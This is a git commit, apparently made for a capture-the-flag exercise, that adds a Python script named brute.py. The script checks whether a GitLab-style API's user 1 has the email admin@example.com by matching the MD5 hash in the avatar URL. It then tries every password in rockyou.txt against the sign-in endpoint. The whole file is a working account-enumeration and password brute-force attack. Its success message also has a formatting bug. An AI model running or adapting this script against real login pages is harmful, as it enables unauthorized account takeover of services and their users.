b1c4f683a83a42f0d614f17dc8a7c0c59cce0ded
TheBestHacker2020 <71783425+TheBestHacker2020@users.noreply.github.com>
2020-09-23 23:59:34 +0700

    Add brute.py

---
+++ brute.py
@@ -0,0 +1,22 @@
+from requests import get,post
+from hashlib import md5
+from re import findall
+
+domain = 'http://s3cur3d4r1k.cf'
+#my_email_pattern = '[a-z]{3}@hackerman.ctf'
+
+r = get(domain+'/api/v4/users/1').json()
+email = findall('([a-z0-9]{32})', r['avatar_url'])[0]
+
+a = True if str((md5("admin@example.com".encode())).hexdigest()) == str(email) else False
+
+if a:
+    print("Standart user found, trying brute...")
+    for i in open('rockyou.txt').readlines():
+        tmp = post(domain+'/users/sign_in', data={'user_login':'admin@example.com', 'user_password':i}).text
+        if 'Invalid Login or password.' not in tmp:
+            print("Success! Password: {i}".format(i))
+            exit(0)
+    print('No password found :(')
+else:
+    print("Standart user not found.")
